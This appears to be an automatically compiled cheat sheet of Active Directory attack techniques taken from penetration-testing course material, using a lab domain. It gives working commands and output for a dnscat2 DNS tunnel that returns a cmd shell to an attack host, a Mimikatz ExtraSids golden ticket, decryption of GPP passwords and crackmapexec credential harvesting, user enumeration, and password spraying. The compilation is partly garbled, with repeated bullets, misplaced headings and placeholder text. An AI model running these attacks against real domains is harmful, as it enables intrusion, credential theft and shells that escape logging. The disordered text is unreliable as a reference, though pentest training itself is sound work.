- Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts.

<a id="technique-detection-and-remediation"></a>
## Detection and Remediation

Aliases: —  
Tags: abuse, acl, attack, bloodhound, dcsync, domain, service  
Category: Active Directory / ACL Abuse Tactics  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Auditing for and removing dangerous ACLs Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
- If we look at the event log after modifying the ACL of the domain object, we will see some event ID 5136 created: Viewing Event ID 5136 Windows Event Viewer showing Security log entry for Event ID 5136, indicating a Directory Service change by administrator on 3/24/2022 at 10:53 AM.
- If we check out the Details tab, we can see that the pertinent information is written in Security Descriptor Definition Language (SDDL) which is not human readable.

### Prerequisites

- Converting the SDDL String into a Readable Format If we choose to filter on the DiscretionaryAcl property, we can see that the modification was likely giving the mrb3n user GenericWrite privileges over the domain object itself, which could be indicative of an attack attempt.

<a id="technique-dictionary-attacks-against-ad-accounts-using-netexec"></a>
## Dictionary attacks against AD accounts using NetExec

Aliases: —  
Tags: attack, discover, domain, host, password, smb, spray  
Category: Active Directory / Attacking Active Directory and NTDS.dit  
OS: Cross-platform, Linux, Windows  
Service: SMB  
Ports: 139, 445

### Remember this attack when

- When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to tailor our attack as much as possible.
- Many organizations follow a naming convention when creating employee usernames.
- A tip from MrB3n : We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails.

### Prerequisites

- Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.
- It is ideal to limit the need to guess as much as possible when conducting password attacks.
- Event logs from the attack Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details.

### Enumeration / Detection

```shell-session
[!bash!]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

<a id="technique-dns-tunneling-with-dnscat2"></a>
## DNS Tunneling with dnscat2

Aliases: Setting Up & Using dnscat2  
Tags: attack, dns, domain, host, https, port, shell, sudo, transfer, tunnel  
Category: Active Directory / DNS Tunneling with Dnscat2  
OS: Cross-platform, Linux, Windows  
Service: DNS, HTTPS  
Ports: 53, 443

### Remember this attack when

- When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request.
- If dnscat2 is not already set up on our attack host, we can do so using the following commands: Cloning dnscat2 and Setting Up the Server We can then start the dnscat2 server by executing the dnscat2 file.
- If all steps are completed successfully, we will see a session established with our server.

### Prerequisites

- We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted.

### Enumeration / Detection

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

### Exploitation

```shell-session
[!bash!]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

```shell-session 
[!bash!]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

```shell-session
[!bash!]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

 ```shell-session 
 New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

### What success looks like

- We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server.
- Cloning dnscat2-powershell to the Attack Host Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.
- We can send back a CMD shell session to our server.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `DNS Tunneling with Dnscat2` → re-enumerate with the gained access.

<a id="technique-domain-trusts-overview"></a>
## Domain Trusts Overview

Aliases: —  
Tags: attack, domain, service  
Category: Active Directory / Domain Trusts Primer  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.
- A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication.
- They are created by design when you set up a new tree root domain within a forest.

### Prerequisites

- For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.
- - One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
- - Bidirectional trust: Users from both trusting domains can access resources in the other domain.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Domain Trusts Primer` → re-enumerate with the gained access.

### Common problems / Why it fails

- Domain trusts are often set up incorrectly and can provide us with critical unintended attack paths.
- I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

### Useful commands

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

<a id="technique-efficacy-of-the-attack"></a>
## Efficacy of the Attack

Aliases: —  
Tags: attack, crack, domain, hashcat, kerberoast, password, ticket  
Category: Active Directory / Kerberoasting - from Linux  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- I would likely write up the finding as high-risk in my report in the first two cases.
- It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.

### Prerequisites

- While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access.
- We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise.
- Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.

- We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise.
- Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.

<a id="technique-enumerating-acls-with-powerview"></a>
## Enumerating ACLs with PowerView

Aliases: —  
Tags: acl, attack, crack, dcsync, domain, hash, hashcat, password, powershell  
Category: Active Directory / ACL Enumeration  
OS: Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Let's dig in and see if this user has any interesting ACL rights that we could take advantage of.
- In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object.
- One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen.

### Prerequisites

- We first need to get the SID of our target user to search effectively.
- Therefore, we may need to run it from a new PowerShell session.
- Further Enumeration of Rights Using damundsen Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group.

<a id="technique-enumerating-dns-records"></a>
## Enumerating DNS Records

Aliases: —  
Tags: attack, bloodhound, discover, dns, domain, host, jenkins, ldap, password  
Category: Active Directory / Miscellaneous Misconfigurations  
OS: Cross-platform, Linux  
Service: DNS, LDAP, jenkins  
Ports: 53, 389, 636, 3268, 3269, 8080

### Remember this attack when

- This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL.
- If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack.
- If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
[+] Found 27 records
```

```shell-session
[+] Found 27 records
```

### What success looks like

- This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL.
- If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.
- By default, querying DNS records using LDAP does not return all results.

## Enumerating Security Controls — LAPS

Aliases: LAPS  
Tags: domain, host, password, sql  
Category: Active Directory / Enumerating Security Controls  
OS: Cross-platform, Windows

Ports: Not fixed / not specified

### Remember this attack when

- Using Find-AdmPwdExtendedRights We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

<a id="technique-enumerating-the-password-policy-from-linux-ldap-anonymous-bind"></a>
## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

Aliases: —  
Tags: domain, ldap, password  
Category: Active Directory / Enumerating & Retrieving Password Policies  
OS: Linux, Windows  
Service: LDAP  
Ports: 389, 636, 3268, 3269

### Remember this attack when

- LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

### Prerequisites

- We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

### Enumeration / Detection

### What success looks like

- LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests.
- We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

<a id="technique-enumerating-the-password-policy-from-linux-smb-null-sessions"></a>
## Enumerating the Password Policy - from Linux - SMB NULL Sessions

Aliases: —  
Tags: dns, domain, ldap, password, rpc, smb  
Category: Active Directory / Enumerating & Retrieving Password Policies  
OS: Linux, Windows  
Service: DNS, LDAP, RPC, SMB  
Ports: 53, 111, 135, 139, 389, 445, 636, 3268, 3269

### Remember this attack when

- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.
- When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration.

### Prerequisites

- Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind.

<a id="technique-enumerating-the-password-policy-from-windows"></a>
## Enumerating the Password Policy - from Windows

Aliases: —  
Tags: attack, domain, host, password, transfer  
Category: Active Directory / Enumerating & Retrieving Password Policies  
OS: Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy.
- Using built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it.
- If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but we should avoid locking out ANY accounts at all costs.

### Prerequisites

- PowerView is also quite handy for this: Using PowerView PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

```powershell-session
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
```

### What success looks like

- Using Get-ADTrust The above output shows that our current domain INLANEFREIGHT.LOCAL has two domain trusts.
- We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts.
- Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow.

<a id="technique-enumerating-users-with-kerbrute"></a>
## Enumerating Users with Kerbrute

Aliases: —  
Tags: attack, domain, kerberos, password, ticket  
Category: Active Directory / Password Spraying - Making a Target User List  
OS: Linux, Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- As mentioned in the Initial Enumeration of The Domain section, if we have no access at all from our position in the internal network, we can use Kerbrute to enumerate valid AD accounts and for password spraying.
- If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid.
- Kerbrute User Enumeration We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones.

### Prerequisites

- However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.
- This will only be triggered if Kerberos event logging is enabled via Group Policy.

### Enumeration / Detection

- If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Password Spraying - Making a Target User List` → re-enumerate with the gained access.

### Common problems / Why it fails

- This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for.
- If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid.
- This method of username enumeration does not cause logon failures and will not lock out accounts.

- No separately named variant was identified in the cited CPTS subsection.

### Remember this attack when

- We will practice our enumeration tactics on the inlanefreight.com domain without performing any heavy scans (such as Nmap or vulnerability scans which are out of scope).
- We will start first by checking our Netblocks data and seeing what we can find.
- Inlanefreight is not a large corporation, so we didn't expect to find that it had its own ASN.

- Credential Hunting Dehashed is an excellent tool for hunting for cleartext credentials and password hashes in breach data.

## Extracting Tickets from Memory with Mimikatz

Aliases: —  
Tags: attack, crack, hash, hashcat, host, kerberos, password, ticket  
Category: Active Directory / Kerberoasting - from Windows  
OS: Cross-platform, Linux, Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
- Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets.
- Cracking the Hash with Hashcat If we decide to skip the base64 output with Mimikatz and type mimikatz kerberos::list /export, the .kirbi file (or files) will be written to disk.

### Prerequisites

- Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
- We then must modify the file a bit to be able to use Hashcat against the hash.
- Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time.

<a id="technique-extrasids-attack-mimikatz"></a>
## ExtraSids Attack - Mimikatz

Aliases: —  
Tags: attack, domain, hash, kerberos, ldap, password, rpc, service, ticket  
Category: Active Directory / Attacking Domain Trusts - Child -> Parent Trusts - from Windows  
OS: Windows  
Service: LDAP, RPC, kerberos  
Ports: 88, 111, 135, 389, 636, 3268, 3269

### Remember this attack when

- This attack allows for the compromise of a parent domain once the child domain has been compromised.
- Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

### Prerequisites

- Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.
- In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.
- To perform this attack after compromising a child domain, we need the following: The KRBTGT hash for the child domain The SID for the child domain The name of a target user in the child domain (does not need to exist!) The FQDN of the child domain.

### Enumeration / Detection

```powershell-session
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

### What success looks like

- Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.
- In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.
- Obtaining the KRBTGT Account's NT Hash using Mimikatz We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

<a id="technique-gathering-users-with-ldap-anonymous"></a>
## Gathering Users with LDAP Anonymous

Aliases: —  
Tags: domain, ldap, password  
Category: Active Directory / Password Spraying - Making a Target User List  
OS: Cross-platform, Linux, Windows  
Service: LDAP  
Ports: 389, 636, 3268, 3269

### Remember this attack when

- We can use various tools to gather users when we find an LDAP anonymous bind.
- If we choose to use ldapsearch we will need to specify a valid LDAP search filter.

### Prerequisites

- If we choose to use ldapsearch we will need to specify a valid LDAP search filter.

### Enumeration / Detection

```shell-session
[!bash!]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

```shell-session
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users:

userPrincipalName: htb-student@inlanefreight.local
```

- Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.

## Get Domain Info

Aliases: —  
Tags: attack, domain, service  
Category: Active Directory / Credentialed Enumeration - from Windows  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with.
- This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts.

<a id="technique-group-membership"></a>
## Group Membership

Aliases: —  
Tags: attack, bloodhound, domain, host, powershell, service  
Category: Active Directory / Credentialed Enumeration - from Windows  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain.

### Prerequisites

<a id="technique-group-policy-object-gpo-abuse"></a>
## Group Policy Object (GPO) Abuse

Aliases: —  
Tags: abuse, acl, attack, bloodhound, domain, hash, host, password, rdp, service, ticket  
Category: Active Directory / Miscellaneous Misconfigurations  
OS: Windows  
Service: RDP  
Ports: 3389

### Remember this attack when

- Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications.
- If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain.
- If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.

### Prerequisites

- If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain.
- Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with GenericWrite, WriteOwner, and WriteDacl permissions to DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL.
- When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to.

### What success looks like

- Enumerating GPO Names with PowerView This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts).
- We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain.
- Converting GPO GUID to Name Checking in BloodHound, we can see that the Domain Users group has several rights over the Disconnect Idle RDP GPO, which could be leveraged for full control of the object.

<a id="technique-group-policy-preferences-gpp-passwords"></a>
## Group Policy Preferences (GPP) Passwords

Aliases: —  
Tags: discover, domain, host, metasploit, password, smb, spray  
Category: Active Directory / Miscellaneous Misconfigurations  
OS: Linux, Windows  
Service: SMB  
Ports: 139, 445

### Remember this attack when

- When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.
- This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP.
- If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

### Prerequisites

- Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
- This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP.
- If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```shell-session
[!bash!]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

```shell-session
[!bash!]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

```shell-session
[!bash!]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

### What success looks like

- Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
- Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
- This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Miscellaneous Misconfigurations` → re-enumerate with the gained access.

### Common problems / Why it fails

- The XML looks like the following: Viewing Groups.xml XML code showing user properties for Administrator with account not disabled and password never expires.
- This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain.
- Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

### Useful commands

```shell-session
[!bash!]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

```shell-session
[!bash!]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

```shell-session
[!bash!]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share

GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
```

## Group3r

Aliases: —  
Tags: domain, hash, host  
Category: Active Directory / Additional AD Auditing Techniques  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Group3r is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy.
- Group3r Basic Usage When running Group3r, we must specify the -s or the -f flag.
- Reading Output Screenshot of GPO settings showing 'Disallow LM Hash' and 'Default Domain Controllers Policy' with details on creation, modification, and registry settings.

### Prerequisites

- Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using runas /netonly).
- Group3r Basic Usage When running Group3r, we must specify the -s or the -f flag.
- Group3r Finding Command prompt showing registry updates for LDAPServerIntegrity, RequireSignOrSeal, RequireSecuritySignature, and EnableSecuritySignature, with user rights assignment details.

### Enumeration / Detection

```cmd-session
C:\htb> group3r.exe -f <filepath-name.log> 
```

### Exploitation

```cmd-session
C:\htb> group3r.exe -f <filepath-name.log> 
```

### What success looks like

- Reading Output Screenshot of GPO settings showing 'Disallow LM Hash' and 'Default Domain Controllers Policy' with details on creation, modification, and registry settings.
- When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings.
- Below we will take a look at the output shown from a finding.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Additional AD Auditing Techniques` → re-enumerate with the gained access.

### Remember this attack when

- If successful, our actions from the shell will not be logged in Event Viewer.
